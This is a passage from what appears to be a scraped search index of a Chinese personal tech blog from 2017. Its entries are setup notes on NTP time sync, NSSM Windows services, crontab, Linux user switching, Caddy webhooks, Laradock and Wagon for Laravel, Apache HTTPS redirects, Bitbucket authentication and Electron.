74,00,25,00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,77,\\ 00,33,00,32,00,74,00,69,00,6d,00,65,00,2e,00,64,00,6c,00,6c,00,00,00 \"Enabled\"=dword:00000001 \"InputProvider\"=dword:00000001 \"AllowNonstandardModeCombinations\"=dword:00000001 \"CrossSiteSyncFlags\"=dword:00000002 \"ResolvePeerBackoffMinutes\"=dword:0000000f \"ResolvePeerBackoffMaxTimes\"=dword:00000007 \"CompatibilityFlags\"=dword:80000000 \"EventLogFlags\"=dword:00000001 \"LargeSampleSkew\"=dword:00000003 \"SpecialPollInterval\"=dword:0000003c \"SpecialPollTimeRemaining\"=hex(7):74,00,69,00,6d,00,65,00,2e,00,77,00,69,00,6e,\\ 00,64,00,6f,00,77,00,73,00,2e,00,63,00,6f,00,6d,00,2c,00,37,00,64,00,37,00,\\ 37,00,61,00,65,00,31,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\\ 00,00,00,00,00,00,00 需要點登入檔案，重新開機才會生效。 這次經驗讓我知道設定NTP是很重要的事情 組長問我NTP時間一定會正確嗎？我後來網路查一下 NTP運算會扣除網路傳輸部份，所以不會有兩台電腦時間不一樣問題 The Will Will Web | 如何調整 Windows 作業系統的時間正確性 ( 終極指令版 ) XYZ的筆記本: windows 時間自動校正 ","date":"2017-12-23","objectID":"/blog/posts/logdown/2017-12-23-one-of-the-different-computer-time-synchronization-methods-ntp-synchronization/:0:0","tags":["NTP"],"title":"不同電腦時間同步方法之一(NTP 同步)","uri":"/blog/posts/logdown/2017-12-23-one-of-the-different-computer-time-synchronization-methods-ntp-synchronization/"},{"categories":["實用工具"],"content":"最近常常執行chat server，需要常常自己開 後來有時忘記開，怕之後有忘記開還有下面執行列多一個很討厭 所以我上網找了一下Window Service有什麼方法可以做 竟然看到不用寫程式，但前提是需要裝這個工具 不多說，先來筆記 #指令 ","date":"2017-12-23","objectID":"/blog/posts/logdown/2017-12-23-you-can-do-window-service-without-writing-a-program/:0:0","tags":["Window Service","NSSM"],"title":"不用寫程式也能做Window Service(NSSM)","uri":"/blog/posts/logdown/2017-12-23-you-can-do-window-service-without-writing-a-program/"},{"categories":["實用工具"],"content":"啟動服務 $ nssm start \"服務名稱\" ","date":"2017-12-23","objectID":"/blog/posts/logdown/2017-12-23-you-can-do-window-service-without-writing-a-program/:1:0","tags":["Window Service","NSSM"],"title":"不用寫程式也能做Window Service(NSSM)","uri":"/blog/posts/logdown/2017-12-23-you-can-do-window-service-without-writing-a-program/"},{"categories":["實用工具"],"content":"停止服務 $ nssm stop \"服務名稱\" ","date":"2017-12-23","objectID":"/blog/posts/logdown/2017-12-23-you-can-do-window-service-without-writing-a-program/:2:0","tags":["Window Service","NSSM"],"title":"不用寫程式也能做Window Service(NSSM)","uri":"/blog/posts/logdown/2017-12-23-you-can-do-window-service-without-writing-a-program/"},{"categories":["實用工具"],"content":"重啟服務 $ nssm restart \"服務名稱\" ","date":"2017-12-23","objectID":"/blog/posts/logdown/2017-12-23-you-can-do-window-service-without-writing-a-program/:3:0","tags":["Window Service","NSSM"],"title":"不用寫程式也能做Window Service(NSSM)","uri":"/blog/posts/logdown/2017-12-23-you-can-do-window-service-without-writing-a-program/"},{"categories":["實用工具"],"content":"刪除服務 $ nssm remove \"服務名稱\" ","date":"2017-12-23","objectID":"/blog/posts/logdown/2017-12-23-you-can-do-window-service-without-writing-a-program/:4:0","tags":["Window Service","NSSM"],"title":"不用寫程式也能做Window Service(NSSM)","uri":"/blog/posts/logdown/2017-12-23-you-can-do-window-service-without-writing-a-program/"},{"categories":["實用工具"],"content":"設定服務(中英文參照) 頁籤 參數 說明 Application Path 執行應用程式的路徑和名稱。 Application Startup Directory 啟動資料夾。 Application Arguments 應用程式參數。 I/O Output (stdout) 結果輸出檔案。 I/O Error (stderr) 錯誤輸出檔案。 中間，有試著測試假如我撞到port，起動NSSM建立好的Server會如何?? 什麼?竟然還繼續Work!!!後來發現原來是NSSM會執行執行程式 所以我關掉chat Server竟然還可以跑 NSSM設定還可以設定很多東西 參考來源： NSSM - the Non-Sucking Service Manager Xian’s 學習筆記: Nginx run as windows service 解決問題 Windows Service (1) | Leo Yeh’s Blog 透過NSSM建立Windows Services | RiCo技術農場 - 點部落 2023-02-22 發現還有winsw 可以用。 Windows下运行服务的几种方式 | 杂烩饭 ","date":"2017-12-23","objectID":"/blog/posts/logdown/2017-12-23-you-can-do-window-service-without-writing-a-program/:5:0","tags":["Window Service","NSSM"],"title":"不用寫程式也能做Window Service(NSSM)","uri":"/blog/posts/logdown/2017-12-23-you-can-do-window-service-without-writing-a-program/"},{"categories":["SQL"],"content":"在Backend 台灣 (Backend Tw)看到 如下 SELECT m1.* FROM messages m1 LEFT JOIN messages m2 ON (m1.name = m2.name AND m1.id \u003c m2.id) WHERE m2.id IS NULL; 這寫法很有趣XD Triton Ho: Group by是 O(n log n) Left join 是O(n^2) George Li Chino Lin : 實際上我如果把資料降到10比左右, 這兩種query 的效能就沒有明顯差異～ http://sqlfiddle.com/#!9/296a6a/1 http://sqlfiddle.com/#!9/296a6a/2 但是筆數拉到300左右就有明顯差異了～ 所以合理判斷資料量上升～ 效能差距會越明顯～ 資料更大的話基本上沒辦法用這平台了ＸＤ Chino Lin: 我自己用一個表約100萬筆來測試 使用left join方式 跑到超過6分鐘沒等下去 ， 但是用子查詢groupby 大約1秒就跑完 後來改成4萬筆left join跑了2分15才跑完 子查詢+groupby也是大約1秒就跑完 我的是mysql5.6 那我看還是用子查詢+groupby就好……. 可能是5.0太舊不值得參考了 select * from messages where Id in (select max(id) from messages group by Name) 補充 可能是MySQL版本問題，正常應該要用Group by 效能會比較好，看到這種特別SQL滿好奇，但這不是最好的解法 純心賞看看就好，更多東西去Backend 台灣 (Backend Tw)裡面看看 ","date":"2017-12-18","objectID":"/blog/posts/logdown/2017-12-18-get-the-latest-sql-for-duplicate-data/:0:0","tags":["sql"],"title":"取得重覆資料最新SQL","uri":"/blog/posts/logdown/2017-12-18-get-the-latest-sql-for-duplicate-data/"},{"categories":["CI"],"content":"因為要做動物機要做自動化 載入yaml想檢查一些設定是不是有錯誤 利用上一篇寫的Exit Codes 程式回傳錯誤碼 « 進擊的程式新手 在透過Bitbucket做設定 今天進行還滿順利 在此筆記 yaml = require(\"js-yaml\"); fs = require(\"fs\"); // Get document, or throw exception on error try { var doc = yaml.safeLoad(fs.readFileSync('config.yml', 'utf8')); //console.log(doc); } catch (e) { console.log('沒法正常解析yaml'); console.error(e); process.exit(1); } yaml = require(\"js-yaml\"); fs = require(\"fs\"); // Get document, or throw exception on error try { var doc = yaml.safeLoad(fs.readFileSync('config.yml', 'utf8')); //console.log(doc); } catch (e) { console.log('沒法正常解析yaml'); console.error(e); process.exit(1); } try { let default_path = doc.templates.default.transmission.path; let olddownload_path = doc.templates.olddownload.transmission.path; let autoPass_path = doc.templates.autoPass.transmission.path; let default_month = default_path.substr(32, 2); let olddownload_month = olddownload_path.substr(32, 2); let autoPass_month = autoPass_path.substr(32, 2); let now_month = new Date().getMonth(); let month_maping = { '0' : '01', '1' : '01', '2' : '01', '3' : '04', '4' : '04', '5' : '04', '6' : '07', '7' : '07', '8' : '07', '09' : '10', '10' : '10', '11' : '10', }; if (month_maping[now_month] != default_month) throw \"config.yml裡default_path沒設定正確(\" + month_maping[now_month] +\")月份名稱\"; if (month_maping[now_month-3] != olddownload_month) throw \"config.yml裡olddownload_month沒設定正確(\" + month_maping[now_month] + \")月份名稱\"; if (month_maping[now_month-3] != autoPass_month) throw \"config.yml裡autoPass_month沒設定正確(\" + month_maping[now_month] + \")月份名稱\"; } catch (error) { console.error(error); process.exit(1); } console.log('測試正常'); image: node:6.9.4 pipelines: default: - step: script: # Modify the commands below to build your repository. - npm install -g yaml-lint - yamllint config.yml - npm install - npm test { \"name\": \"yaml_config\", \"version\": \"1.0.0\", \"description\": \"\", \"main\": \"test.js\", \"dependencies\": { \"js-yaml\": \"^3.10.0\" }, \"devDependencies\": {}, \"scripts\": { \"test\": \"node test\" }, \"repository\": { \"type\": \"git\", \"url\": \"git+https://malagege@bitbucket.org/malagege/yaml_config.git\" }, \"author\": \"\", \"license\": \"ISC\", \"homepage\": \"https://bitbucket.org/malagege/yaml_config#readme\" } ","date":"2017-12-13","objectID":"/blog/posts/logdown/2017-12-13-js-yaml-write-test-program-to-do-a-simple-check-on-configuration-files/:0:0","tags":["js-yaml","yaml","自動化","測試"],"title":"寫測試程式用js-yaml對設定檔做簡查","uri":"/blog/posts/logdown/2017-12-13-js-yaml-write-test-program-to-do-a-simple-check-on-configuration-files/"},{"categories":["Linux"],"content":"最近忘記這篇Controb排程設定 « 進擊的程式新手之前下的指令要怎麼用 所以記錄一下 以免在次花一堆時間查詢 sudo -u debian-transmission crontab -e [root@study ~]# su [-lm] [-c 指令] [username] 選項與參數： - ：單純使用 - 如『 su - 』代表使用 login-shell 的變數檔案讀取方式來登入系統； 若使用者名稱沒有加上去，則代表切換為 root 的身份。 -l ：與 - 類似，但後面需要加欲切換的使用者帳號！也是 login-shell 的方式。 -m ：-m 與 -p 是一樣的，表示『使用目前的環境設定，而不讀取新使用者的設定檔』 -c ：僅進行一次指令，所以 -c 後面可以加上指令喔！ 先sudo -i進入root權限，再下su -m debian-transmission指令就可以進去shell介面 [root@study ~]# sudo [-b] [-u 新使用者帳號] 選項與參數： -b ：將後續的指令放到背景中讓系統自行執行，而不與目前的 shell 產生影響 -u ：後面可以接欲切換的使用者，若無此項則代表切換身份為 root 。 2019-10-24 ","date":"2017-12-13","objectID":"/blog/posts/logdown/2017-12-13-linux-switch-user-notes/:0:0","tags":["Linux","su","sudo"],"title":"[Linux]切換使用者筆記","uri":"/blog/posts/logdown/2017-12-13-linux-switch-user-notes/"},{"categories":["Linux"],"content":"切換使用者(帳號)方法 先sudo -i進入root權限，再下su -m debian-transmission指令就可以進去shell介面 除了這招，最近 docker 執行 cmd 的方法讓我想到一個方法sudo -u debian-transmission bash ","date":"2017-12-13","objectID":"/blog/posts/logdown/2017-12-13-linux-switch-user-notes/:1:0","tags":["Linux","su","sudo"],"title":"[Linux]切換使用者筆記","uri":"/blog/posts/logdown/2017-12-13-linux-switch-user-notes/"},{"categories":["Linux"],"content":"newgrp, groups 之前有紀錄 Linux 利用 usermod 修改使用者的參數和資料 | 程式狂想筆記 但當時還菜現在也很菜 沒有紀錄很完整 例如剛剛安裝完 docker 只能用 root 方法去執行 如果想把一般 user 使用 docker 方法，就把 user 加到 docker 使用者 sudo usermod -G docker -a testuser [Docker] 使用非 root 權限來執行 docker client | EPH 的程式日記 例如這個 要重開 bash 或 newgrp docker可以使用 當年就是看太快，想說奇怪怎麼沒用 詳細講一下 newgrp docker，其實我覺得他有點向開一個新 bash 如果很難懂看下面應該很好懂 groups 第一個就是目前群組 newgrp 切換群組 此為帳號和群組管理相關的指令, newgrp 指令類似 login 以相同的帳號登入另一個群組,以指令 exit 又回到原群組。 $ groups ←列出有那些有群組成員 frank marketing ←有效群組(effective group)目前為〝frank〞(列在前的為有效群組) $ newgrp marketing ←登入〝marketing〞群組 $ groups ←驗證有無登入另一個群組 marketing frank ←有效群組變〝marketing〞了 $ exit ←回原群組 $ groups ←驗證看看 frank marketing 參考 阿旺的 Linux 開竅手冊 newgrp 指令 再看Linux newgrp命令用法详解：切换用户的有效组圖 1 newgrp 切換初始組程序運行過程圖 應該可以更清楚了解 ","date":"2017-12-13","objectID":"/blog/posts/logdown/2017-12-13-linux-switch-user-notes/:2:0","tags":["Linux","su","sudo"],"title":"[Linux]切換使用者筆記","uri":"/blog/posts/logdown/2017-12-13-linux-switch-user-notes/"},{"categories":["Linux"],"content":"我想的管理帳號方法 Transmission 會建立 debian-transmission 帳號。 Docker 會建立 docker 帳號。 所以一個應用程式獨立一個帳號 然後利用加群組方式授權帳號 可以算是一個管理模式 這樣不用再注意777的問題 參考來源: 鳥哥的 Linux 私房菜 – 第十三章、Linux 帳號管理與 ACL 權限設定 技术|chgrp 和 newgrp 命令简介 ","date":"2017-12-13","objectID":"/blog/posts/logdown/2017-12-13-linux-switch-user-notes/:3:0","tags":["Linux","su","sudo"],"title":"[Linux]切換使用者筆記","uri":"/blog/posts/logdown/2017-12-13-linux-switch-user-notes/"},{"categories":["程式心法"],"content":"看到上一篇Crontab 執行特定目錄 « 進擊的程式新手 我就想想我寫的程式如何寫出err訊息 然後在Bitbucket測試程式可以跑 後來Google到Exit Codes - Shell Scripting Tutorial 原來每一個程式語言有類似System.exit(int i)這個東西 0表示程式正常，其他值表式程式有錯誤 這時候zsh前面會有x表示 理解 Exit Code 並學會如何在 Bash 腳本中使用 - 壹讀 Exit Codes - Shell Scripting Tutorial ","date":"2017-12-12","objectID":"/blog/posts/logdown/2017-12-12-exit-codes-program-return-error-code/:0:0","tags":["exit code","system.exit"],"title":"Exit Codes 程式回傳錯誤碼","uri":"/blog/posts/logdown/2017-12-12-exit-codes-program-return-error-code/"},{"categories":["Linux"],"content":" 50 * * * * cd /home/me/.flexget \u0026\u0026 sh /home/me/.flexget/gitpull.sh \u003e/dev/null 2\u003e\u00261 假如前面沒有做cd動作，執行目錄不會是在相同目錄 在此筆記，以後就不用查了 直接看筆記XD 在鳥哥看到12.2.2 script 的執行方式差異 (source, sh script, ./script) 相信可能跟這個也很有關係 摩托學園討論區 • 檢視主題 - [分享] 研究 2\u003e\u00261 後的一點點心得 也看到\u003e/dev/null執行正確不會東西，但是執行錯誤會顯示在console上面 但是2\u003e\u00261會把錯誤資訊鳥在/dev/null (前提看你前面寫什麼) 詳細看裡面教學 2020-04-25 # 輸出結果也不太一樣 ls \u003e dirlist 2\u003e\u00261 ls 2\u003e\u00261 \u003e dirlist # 對於第二種情況，標準錯誤只是使用了標準輸出的文件表項，而標準輸出使用了 dirlist 的文件表項。 參考:Bash中的IO與重定向 | 退思園 What is the ‘working directory’ when cron executes a job? - Unix \u0026 Linux Stack Exchange unix - Crontab - Run in directory - Stack Overflow 鳥哥的 Linux 私房菜 – 第十二章、學習 Shell Scripts 摩托學園討論區 • 檢視主題 - [分享] 研究 2\u003e\u00261 後的一點點心得 crontab Jitter APScheduler的使用详解_ITPUB博客 #!/bin/bash maxdelay=$((14*60)) # 14 hours from 9am to 11pm, converted to minutes for ((i=1; i\u003c=20; i++)); do delay=$(($RANDOM%maxdelay)) # pick an independent random delay for each of the 20 runs (sleep $((delay*60)); /path/to/phpscript.php) \u0026 # background a subshell to wait, then run the php script done bash - Cron jobs and random times, within given hours - Stack Overflow Avoid the “top of the minute problem” - space out your cronjobs - Ask Bjørn Hansen A little jitter can help (evening out distributed cron-based tasks) | Server Check.in A little jitter can help (evening out distributed cron-based tasks) | Server Check.in ","date":"2017-12-12","objectID":"/blog/posts/logdown/2017-12-12-crontab-execution-specific-directory/:0:0","tags":["crontab"],"title":"Crontab 執行特定目錄","uri":"/blog/posts/logdown/2017-12-12-crontab-execution-specific-directory/"},{"categories":["Git"],"content":"最近想自動化樹莓派同步git server上面的東西 有找到要使用webhook 目前樹莓派上面沒有啟用fastcgi東西 上次有看到caddy他還有類似webhook這玩意 就玩一下，筆記 abiosoft/caddy-git: git middleware for Caddy 首先就先用gitea來建立server測試 執行caddy的時候 會git pull動作 caddy-git文件寫預設1小時會git pull動作 localhost:80 git { repo http://localhost:3000/root/test.git path C:/test/ } 要設定多久要git pull 可以設定 interval 60 是1分鐘git pull動作 要加入webhook 只要設定 localhost:80 git { repo http://localhost:3000/root/test.git path C:/test/ #interval 60 hook /webhook test } 可以用#當注解 hook設定也想當簡單 hook /webhook secret-password 當然gitea設定webhook也很簡單 [img]https://i.imgur.com/5pFYK8Z.png[/img] 這樣就搞定了 這之後我也有找一些webhook工具 但是都沒有看到apache相關webhook東西 NetEaseGame/git-webhook: 使用 Python Flask + SQLAchemy + Celery + Redis + React 开发的用于迅速搭建并使用 WebHook 进行自动化部署和运维，支持 Github / GitLab / Gogs / GitOsc。 Webhook 实践 —— 自动部署 | 咀嚼之味 Raspberry Pi Raspbian Jessie 安裝設定 – 靠der Cowder – Medium 原本想試試rvagg/github-webhook-handler: Node.js web handler / middleware for processing GitHub Webhooks 不過對systemd還不是很熟 不知道要怎麼設定 最後，我覺得直接crontab設定1小時做git pull動作 因為我的需求也不需要很及時做更新 這應該就能解決我的需求 待下次作筆記 孤島日誌: Unix 重新導向跟 2\u003e\u00261 “\u003e /dev/null 2\u003e\u00261” 的意思 – Linux 技術手札 摩托學園討論區 • 檢視主題 - [分享] 研究 2\u003e\u00261 後的一點點心得 ","date":"2017-11-26","objectID":"/blog/posts/logdown/2017-11-26-3865744/:0:0","tags":["webhook","caddy","caddy-git"],"title":"用caddy-git使用webhook初體驗","uri":"/blog/posts/logdown/2017-11-26-3865744/"},{"categories":["Linux"],"content":"這是簡單caddy架設筆記 在FB上看到有人推這個 會自動建立 Let’s Encrypt 憑證 不需要設定 就很好奇玩了一下 在沒有設定Caddyfile port預設為2015 支援日文、簡體中文、韓文檔案下載 哈，不知道能不能當hfs 在同目錄新增Caddyfile 官網文件The Caddyfile Syntax 設定感覺不難 內容如下 localhost:80 root . gzip log browse browse可幾乎同等於autoindex，可惜沒有預設設定排序 不過會記憶選擇後的排序 可以指定Caddyfile目錄 caddy -conf C:\\Users\\xxx\\Desktop\\caddy\\Caddyfile 短時間不知道能不能取代我的apache 不過目前懶的做更換 還發現有caddy-git這個東西 改天做研究 ","date":"2017-11-26","objectID":"/blog/posts/logdown/2017-11-26-caddy-first-small-experience/:0:0","tags":["caddy","web server"],"title":"Caddy Web Server初次小體驗","uri":"/blog/posts/logdown/2017-11-26-caddy-first-small-experience/"},{"categories":["HTML"],"content":"因為最近程式需要從IE8到IE11相容易改版 今天同事問我他跟我說他最近網路遇到的怪事 IE8做submit可以接收到多個select資料 但是IE11確不行…. 後來發現這真的不是很多人知道的東西 做一下筆記 #select 地雷 ##value設定沒有options裡面的值 當設定select.value=‘ffff’，但是select沒有內容，select將會為\"“空字串 The value IDL attribute, on getting, must return the value of the first option element in the list of options in tree order that has its selectedness set to true, if any. If there isn't one, then it must return the empty string. HTML Standard ##select設定沒有內容值，submit不會送出去 如上面的「value設定沒有options裡面的值」 不會送出去 可參考第5點 If the field element is a select element, then for each option element in the select element's list of options whose selectedness is true and that is not disabled, append an entry to the form data set with the name as the name, the value of the option element as the value, and type as the type. HTML Standard ##option沒設定value，預設value為text名稱 \u003cselect\u003e \u003coption\u003etest\u003c/option\u003e \u003c/select\u003e 上面沒有設定value預設會以text內容為主(上面option value為test) The value attribute provides a value for element. The value of an option element is the value of the value content attribute, if there is one, or, if there is not, the value of the element's text IDL attribute. HTML Standard ","date":"2017-11-25","objectID":"/blog/posts/logdown/2017-11-25-form-forms-send-out-things-that-might-not-have-been-noticed-select-mines/:0:0","tags":["select","地雷","Form","HTML"],"title":"Form 送出可能沒注意到的事情(select地雷)","uri":"/blog/posts/logdown/2017-11-25-form-forms-send-out-things-that-might-not-have-been-noticed-select-mines/"},{"categories":["HTML"],"content":"checkbox radio 地雷 打勾(v)確沒有設定value值，value預設傳on Otherwise, if the field element is an input element whose type attribute is in the Checkbox state or the Radio Button state, then: If the field element has a value attribute specified, then let value be the value of that attribute; otherwise, let value be the string \"on\". Append an entry to the form data set with name as the name, value as the value, and type as the type. 當沒選擇檔案submit情況 Otherwise, if the field element is an input element whose type attribute is in the File Upload state, then for each file selected in the input element, append an entry to the form data set with the name as the name, the file (consisting of the name, the type, and the body) as the value, and type as the type. If there are no selected files, then append an entry to the form data set with the name as the name, the empty string as the value, and application/octet-stream as the type. 這有遇到過，但也沒找到相關文件 原來文件有寫這個 #結論 IE8可以跑多個select原因 是因為IE8 bug關係 IE11就照原本W3C文件規範XD 這次真的了解很多東西 ","date":"2017-11-25","objectID":"/blog/posts/logdown/2017-11-25-form-forms-send-out-things-that-might-not-have-been-noticed-select-mines/:1:0","tags":["select","地雷","Form","HTML"],"title":"Form 送出可能沒注意到的事情(select地雷)","uri":"/blog/posts/logdown/2017-11-25-form-forms-send-out-things-that-might-not-have-been-noticed-select-mines/"},{"categories":["SQL"],"content":"用is比較null，不能用= Re: [SQL ] 是否避免null值 - 看板 Database - 批踢踢實業坊 Re: [SQL ] 是否避免null值 - 看板 Database - 批踢踢實業坊 ","date":"2017-11-18","objectID":"/blog/posts/logdown/2017-11-18-3523839/:0:0","tags":["sql"],"title":"[SQL]比較null不能用等於","uri":"/blog/posts/logdown/2017-11-18-3523839/"},{"categories":["Laravel"],"content":"試試用 Docker 來記記 laravel 筆記 建置 laravel 專案 composer 建立 composer global require \"laravel/installer\" laravel new blog 或 composer create-project --prefer-dist laravel/laravel blog 沒有安裝 composer 可以直接 git clone 下來 git clone http://github.com/laravel/laravel 建立 laradock 在 laravel 目錄下面 git submodule add https://github.com/Laradock/laradock.git 在 laradocker 目錄下複製範例 example-env，命名為.env cp env-example .env 執行 docker docker-compose up -d nginx mysql 設置 laravel 目錄，env 設定 (PS:這邊的 env 跟 docker env 不一樣，不要搞錯了) docker-compose exec workspace bash $ root@workspace:/var/www# composer install $ root@workspace:/var/www# cp .env.example .env $ root@workspace:/var/www# php artisan key:generate $ root@workspace:/var/www# exit $root@server:~/laravel/laradock# cd .. $root@server:~/laravel# sudo chmod -R 777 storage bootstrap/cache 設定 laravel 裡的.env DB 設定 DB_DATABASE=default DB_USERNAME=default DB_PASSWORD=secret 請參照你的 laradocker DB 帳號、密碼去做設定 127.0.0.1 請改成 mysql or mariadb (依照 DB 選譯) MYSQL_DATABASE=default MYSQL_USER=default MYSQL_PASSWORD=secret 已經測試過在 play with docker 可以跑了 2019-06-09 使用 MySQL 8.0 由於登入 caching_sha2_password unable to connect to MySQL after upgrade to latest (8) version · Issue #2043 · laradock/laradock Documentation - Laradock SQLSTATE[HY000] [2054] The server requested authentication method unknown to the client · Issue #1392 · laradock/laradock 假如 DB 沒限制的話，我推薦改使用 mariaDB 快速解決 參考來源 https://laravel.tw/docs/5.3/installation http://laradock.io/guides/#set-up-your-laravel-project 不專業網管筆記: [ 練習] 使用 Laradock 建立 Laravel 開發環境 (舊版說明) t301000.blogspot.com/2017/01/laradock-laravel.html laradock 数据库连接问题 | Laravel China 社区 Laradock — Laravel + Docker 輕量級環境打造 – Yifan Wu – Medium ","date":"2017-11-18","objectID":"/blog/posts/logdown/2017-11-18-3523831/:0:0","tags":["Laravel","PHP","docker"],"title":"laradock架設筆記","uri":"/blog/posts/logdown/2017-11-18-3523831/"},{"categories":["Laravel"],"content":"試著用wagon架設laravel 先做一下筆記…. Releases · laravel-dojo/wagon下載解壓縮 執行/wagon/uwamp/UwAmp.exe Apache 已啟用 rewrite module、Document Root 設定在 wagon\\uwamp\\www\\default、port 改設定為 8000 MySQL port 改設定為 33060，可用 root/root 登入 adminer 位置為 http://localhost:8000/adminer 想使用內建Laravel-demo範例，可參考www/demo1 點擊 apache config 更改 wagon:8000裡的 Document Root: {DOCUMENTPATH}/demo1/public 調整laravel env mysql環境變數 EX: DB_CONNECTION=mysql DB_HOST=127.0.0.1 DB_PORT=33060 DB_DATABASE=homestead DB_USERNAME=root DB_PASSWORD=root 請順便建立你命名DB名稱(DB_DATABASE) 4.在laravel 執行下面指令 php artisan migrate SQLSTATE[42S02]: Base table or view not found: 1146 Table 'homestead.tasks' doesn't exist (SQL: select * from `tasks` order by `created_at` desc) search► 出現以上錯誤代表沒執行php artisan migrate 參考來源 Releases · laravel-dojo/wagon What step am I missing? ","date":"2017-11-18","objectID":"/blog/posts/logdown/2017-11-18-3523814/:0:0","tags":["wagon","Laravel","PHP"],"title":"wagon架設筆記","uri":"/blog/posts/logdown/2017-11-18-3523814/"},{"categories":["Apache"],"content":"上次動物機設定TSL有做過設定 不過網路上發現有一個方法 先記一下筆記 NameVirtualHost *:80 \u003cVirtualHost *:80\u003e ServerName www.example.com Redirect / https://secure.example.com/ \u003c/VirtualHost\u003e \u003cVirtualHost _default_:443\u003e ServerName secure.example.com DocumentRoot /usr/local/apache2/htdocs SSLEngine On # etc... \u003c/VirtualHost\u003e 在80設定檔可以看到 Redirect / https://secure.example.com/可以導到80 port 但好像不能像rewrite_mod方法導到一樣頁面 在這邊筆記一下。 ===== 另外一個，rewrite_mod之前有記錄過… Raspberry PI 自動設定Let’s Encrypt！ TLS(SSL 憑證) 參考來源： NameVirtualHost ","date":"2017-11-09","objectID":"/blog/posts/logdown/2017-11-09-3423821/:0:0","tags":["Apache","TLS","rewrite_mod"],"title":"Apache 80 port 網址自動轉443 port方法","uri":"/blog/posts/logdown/2017-11-09-3423821/"},{"categories":["Linux"],"content":"要做blog移轉，筆記先存檔… 不過這篇可能不用實作了 http://thesociablegeek.com/node/github-continuous-deployment-to-a-raspberry-pi/ GitHub Continuous deployment to a Raspberry Pi | The Sociable Geek Localtunnel - 分享 Localhost Web Server - 蟑螂窩 ","date":"2017-11-06","objectID":"/blog/posts/logdown/2017-11-06-3305711/:0:0","tags":null,"title":"Raspberry PI  Git Webhook...","uri":"/blog/posts/logdown/2017-11-06-3305711/"},{"categories":["Git"],"content":"前幾個月有個程式，因為需要多人做設定檔 所以就使用bitbucket來管理 在樹莓派一直遇到要打帳號、密碼 其怪，私鑰那些我都要試過阿 結果Google一下，發現這篇 Git on Bitbucket: Always asked for password, even after uploading my public SSH key - Stack Overflow 預設是https情況下會問密碼 在.git/config把網址改成ssh網址確實可運做了 ssh://git@bitbucket.org/userName/repoName.git As explained here, if you clone with SSH url, you don't need to enter username / password each time you push / pull. Check above answer by @manojlds But if you want to clone with HTTPS and want to avoid entering username / password each time, you can store credentials into cache with below command: git config --global credential.helper 'cache --timeout 3600' where 3600 (seconds) means 1 hour, you may change it as per your requirement. 網路上有一個解法，http://username:password@bitbucket.org/... 但感覺不安全…. ","date":"2017-11-06","objectID":"/blog/posts/logdown/2017-11-06-3301727/:0:0","tags":["BitBucket","git"],"title":"[BitBucket]做git pull一直問你輸入密碼","uri":"/blog/posts/logdown/2017-11-06-3301727/"},{"categories":["Linux"],"content":"最近發現我上次設定的crontab 指令沒有成功 仔細看了一下 Nov 1 01:00:01 raspberrypi /USR/SBIN/CRON[1361]: (debian-transmission) CMD (mkdir /mnt/extHDD/Download/Mikata/`date \"+) grep CRON /var/log/syslog cron log:/var/log/cron 難道crontab不能打百分比，需要補個跳拖字元… google一下，發現還真的有 https://tlanyan.me/percent-sign-in-crontab/ 這次還忘記要怎麼切換權限，那個沒特別開一個文章 不過好險有做筆記的習慣，真的文章一找就有。 覺得下次記一下，怎麼切換別的帳號 不然太久真的忘記了 ","date":"2017-11-05","objectID":"/blog/posts/logdown/2017-11-05-3279650/:0:0","tags":["Crontab","Linux"],"title":"Crontab指令打百分比需要跳脫符號","uri":"/blog/posts/logdown/2017-11-05-3279650/"},{"categories":["Apache"],"content":"今天同事請較我，順便讓我看到他網站有類似用include方法載入別的頁面 \u003c!--#include virtual=\"../quote.txt\" --\u003e 但這個我沒看過… 搜尋一下是，Server Side Includes 因為沒有看過 覺得還滿奇特，記錄一下XD 感覺就像include網頁，現在每個程式應該都有include功能才是 可能靜態網頁就沒有了 有看到有安全性的問題 目前可能猜想跟XSS有關係吧 https://zh.wikipedia.org/wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%86%85%E5%B5%8C ","date":"2017-09-20","objectID":"/blog/posts/logdown/2017-09-20-2511953/:0:0","tags":["SSI","Apache"],"title":"Server Side Includes(SSI)記錄","uri":"/blog/posts/logdown/2017-09-20-2511953/"},{"categories":["electron"],"content":"要做blog移轉，筆記先存檔… Electron 中文文檔 https://dl.lianst.com/ebook/Electron%20%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3.pdf http://zhuxindaba.github.io/2016/07/05/Electron/desktop_environment_integration/ var {Menu, Tray} = require('electron').remote const trayIcon = path.join(__dirname, 'icons/icon-16x16.png'); const tray = new Tray(trayIcon); https://www.christianengvall.se/electron-packager-tutorial/ https://github.com/electron/electron/issues/7657 ","date":"2017-09-19","objectID":"/blog/posts/logdown/2017-09-19-2496270/:0:0","tags":null,"title":"electron 新手做Tray通知(以electron-chat-app-demo為例)","uri":"/blog/posts/logdown/2017-09-19-2496270/"},{"categories":["electron"],"content":"要做blog移轉，筆記先存檔… https://github.com/pfan123/electron-docs Logdown https://logdown.com/account/posts/2463354/edit electron-packager https://github.com/pfan123/electron-docs Getting Started for Electron https://help.syncfusion.com/js/electron demian85/electron-chat-app-demo: Simple Electron Chat App Demo (evaluation task) https://github.com/demian85/electron-chat-app-demo pfan123/electron-docs: electron-docs学习文档 https://github.com/pfan123/electron-docs Squirrel.Windows/5-updating.md at master · Squirrel/Squirrel.Windows https://github.com/Squirrel/Squirrel.Windows/blob/master/docs/getting-started/5-updating.md chat package.json \"dependencies\": { \"express\": \"4.14.0\", \"marked\": \"^0.3.6\", \"socket.io\": \"1.4.8\", \"babel-cli\": \"^6.16.0\", \"babel-preset-react\": \"^6.16.0\", \"electron\": \"^1.4.2\", \"eslint\": \"^3.7.0\", \"eslint-config-airbnb\": \"^12.0.0\", \"eslint-plugin-import\": \"^1.16.0\", \"eslint-plugin-jsx-a11y\": \"^2.2.2\", \"eslint-plugin-react\": \"^6.3.0\" } 1181 verbose unbuild rmStuff eslint-config-airbnb@12.0.0 from C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\electron-packager\\win32-x64\\electron-chat-app-demo-win32-x64\\resources\\app\\node_modules 1182 verbose unbuild rmStuff in node_modules 1183 info lifecycle eslint-config-airbnb@12.0.0~postuninstall: eslint-config-airbnb@12.0.0 1184 silly unbuild eslint@3.19.0 1185 info lifecycle eslint@3.19.0~preuninstall: eslint@3.19.0 1186 info lifecycle 